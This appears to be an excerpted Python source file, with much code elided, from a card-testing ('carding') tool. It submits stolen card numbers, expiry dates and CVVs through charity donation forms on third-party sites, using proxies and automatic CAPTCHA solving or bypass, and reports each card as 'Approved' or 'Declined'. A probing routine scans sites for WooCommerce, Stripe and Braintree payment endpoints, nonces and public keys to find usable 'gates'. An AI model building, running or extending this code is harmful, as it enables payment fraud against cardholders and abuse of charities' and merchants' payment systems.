...
from captcha_solver import detect_captcha, auto_solve_page, get_captcha_form_data, CAPTCHA_TYPES
...
def _smart_donation_amount():
    random_enabled = str(get_gate_setting("stripe", "random_amount", "false")).lower() == "true"
    if random_enabled:
        try:
...
def check_stripe(cc, mes, ano, cvv, country_code="US"):
    ...
    hybrid_on = str(get_gate_setting("stripe", "hybrid_mode", "false")).lower() == "true"
    if hybrid_on:
        try:
...
def _do_check(s, cc, mes, ano, cvv, site_url, donate_path, country_code="US"):
    ...
    if captcha_result.get("needed"):
        ...
        if captcha_result["solved"]:
            ...
            s.__dict__['_captcha_info'] = {
                "type": captcha_result.get("captcha_type"),
                "solved": True,
                "provider": captcha_result.get("provider", ""),
                "time": captcha_result.get("time", 0),
            }
            ...
            return {**_error_result(cc, mes, ano, cvv, f"CAPTCHA ({ctype_label})", proxy_addr), "_retry": True}
    ...
    if not pm_id:
        ...
        if _is_refresh_error(detail):
            return {**_error_result(cc, mes, ano, cvv, detail, proxy_used), "_retry": True, "brand": card_brand or "N/A"}
        label = "Approved" if status in ("live", "charged") else "Declined"
        return {
            "status": status, "cc": f"{cc}|{mes}|{ano}|{cvv}",
    ...
    if _is_refresh_error(result_msg):
        return {**_error_result(cc, mes, ano, cvv, result_msg, proxy_used), "_retry": True, "brand": card_brand or "N/A"}
...
def _tokenize_card(cc, mes, ano, cvv, pub_key, site_url, country_code="US"):
    try:
        ...
        logger.error(f"Tokenization error: {str(e)[:200]}")
...
def _submit_donation(s, site_url, pm_id, nonce_val, form_val, campaign_id,
    ...
    try:
        ...
        captcha_data = get_captcha_form_data(s)
        if captcha_data:
            donation_data.update(captcha_data)
            logger.info(f"CAPTCHA token added to donation form ({list(captcha_data.keys())[0]})")
...
def _error_result(cc, mes, ano, cvv, detail, proxy_used=None):
    return {
...
def detect_gate_type(full_url):
    ...
    try:
        try:
            ...
            all_html = r.text
            pages_html["main"] = r.text
        except Exception:
            return result

        html_lower = all_html.lower()

        # Expanded probe paths for better gate detection
        probe_paths = [
            "/my-account/", "/my-account-2/", "/account/",
            "/my-account/add-payment-method/", "/my-account-2/add-payment-method/",
            "/account/add-payment-method/",
            "/checkout/", "/donate/", "/donations/", "/give/",
            "/shop/", "/cart/", "/payment/",
            "/make-a-donation/", "/support/",
        ]
        given_path = parsed.path if parsed.path and parsed.path != "/" else ""
        if given_path and given_path not in probe_paths:
            probe_paths.insert(0, given_path)

        for path in probe_paths:
            if path in ("", "/"):
                continue
            try:
                pr = s.get(f"{base_url}{path}", verify=False, timeout=10, allow_redirects=True)
                if pr.status_code == 200 and len(pr.text) > 500:
                    pages_html[path] = pr.text
                    all_html += "\n" + pr.text
            except Exception:
                continue
        ...
        if '_charitable_donation_nonce' in html_lower:
            scores["stripe"] += 5
            result["signals"].append("charitable donation nonce")
        if 'charitable' in html_lower and ('donate' in html_lower or 'donation' in html_lower):
            scores["stripe"] += 3
            result["signals"].append("charitable + donation")
        if 'donate' in html_lower or 'donation' in html_lower:
            scores["stripe"] += 1

        pk_match = re.search(r'pk_(?:live|test)_[A-Za-z0-9]{20,}', all_html)
        if pk_match:
            found_pk = pk_match.group(0)
            result["detected_keys"]["stripe_pub_key"] = found_pk
            scores["stripe"] += 2
            scores["stripe_auth"] += 2
            scores["stripe_intent"] += 2
            result["signals"].append(f"stripe key: {found_pk[:25]}...")

        if 'js.stripe.com' in html_lower or 'stripe.js' in html_lower:
            scores["stripe"] += 1
            scores["stripe_auth"] += 1
            scores["stripe_intent"] += 1
            result["signals"].append("stripe.js loaded")

        if 'wc-ajax=wc_stripe_frontend_request' in html_lower or 'wc_stripe_frontend_request' in html_lower:
            scores["stripe_intent"] += 5
            result["signals"].append("WC Stripe frontend request (Intent)")
        if 'setup-intent' in html_lower or 'setup_intent' in html_lower or 'setupintent' in html_lower:
            scores["stripe_intent"] += 4
            result["signals"].append("setup intent endpoint")
        if 'wc-stripe-setup-intent-nonce' in html_lower:
            scores["stripe_intent"] += 5
            result["signals"].append("WC Stripe setup intent nonce")

        if 'wc_stripe_create_setup_intent' in html_lower:
            scores["stripe_auth"] += 4
            scores["stripe_intent"] += 3
            result["signals"].append("WC create setup intent")
        if 'add_card_nonce' in html_lower or 'add-payment-method' in html_lower:
            scores["stripe_auth"] += 3
            result["signals"].append("add payment method page")
        if 'woocommerce-register-nonce' in html_lower:
            scores["stripe_auth"] += 3
            scores["braintree_auth"] += 2
            result["signals"].append("WC register nonce")

        if 'woocommerce-login-nonce' in html_lower:
            scores["stripe_auth"] += 2
            scores["braintree_auth"] += 3
            result["signals"].append("WC login nonce")
        if 'woocommerce-add-payment-method-nonce' in html_lower:
            scores["stripe_auth"] += 3
            scores["braintree_auth"] += 3
            result["signals"].append("WC add payment method nonce")

        if 'braintree' in html_lower:
            scores["braintree"] += 2
            scores["braintree_auth"] += 1
            result["signals"].append("braintree keyword")
        if 'braintreegateway' in html_lower or 'braintree-api' in html_lower:
            scores["braintree"] += 3
            scores["braintree_auth"] += 3
            result["signals"].append("braintree API/gateway")
        if 'braintree-web' in html_lower or 'braintree.js' in html_lower:
            scores["braintree"] += 2
            scores["braintree_auth"] += 2
            result["signals"].append("braintree.js")

        bt_token_match = re.search(r'(?:client_token|clientToken|braintree_client_token)\s*[=:]\s*["\']([A-Za-z0-9+/=]{50,})["\']', all_html)
        if bt_token_match:
            scores["braintree"] += 3
            scores["braintree_auth"] += 2
            result["signals"].append("BT client token found")
        if 'wc_braintree_client_token' in html_lower:
            scores["braintree_auth"] += 5
            result["signals"].append("WC Braintree client token")

        if 'woocommerce' in html_lower or 'wc-ajax' in html_lower:
            result["signals"].append("WooCommerce detected")
            if scores["braintree"] > 0 and 'add-payment-method' in html_lower:
                scores["braintree_auth"] += 3
            if scores["stripe"] > 0 and 'add-payment-method' in html_lower:
                scores["stripe_auth"] += 2

        if 'add_to_cart' in html_lower or 'orders/populate' in html_lower:
            scores["braintree"] += 2
            result["signals"].append("cart/checkout flow")
        if '/checkout/onepage' in html_lower or 'checkout_path' in html_lower:
            scores["braintree"] += 2

        merchant_match = re.search(r'merchants/([a-z0-9]{16})/client_api', all_html)
        if merchant_match:
            result["detected_keys"]["merchant_id"] = merchant_match.group(1)
            scores["braintree_auth"] += 2
...
def setup_gate_from_url(full_url):
    ...
    try:
        ...
        if captcha_info["detected"]:
            ctype = captcha_info["type"] or "unknown"
            ctype_label = CAPTCHA_TYPES.get(ctype, ctype)
            results["captcha_detected"] = True
            results["captcha_type"] = ctype
            results["captcha_sitekey"] = captcha_info.get("sitekey", "")
            results["auto_detected"].append(f"CAPTCHA: {ctype_label}")
            if captcha_info.get("sitekey"):
                results["auto_detected"].append(f"CAPTCHA sitekey: {captcha_info['sitekey'][:20]}...")
            from config import get_captcha_setting
            has_key = bool(get_captcha_setting("api_key"))
            results["auto_detected"].append(f"CAPTCHA auto-solve: {'API READY' if has_key else 'FREE BYPASS MODE'}")
        else:
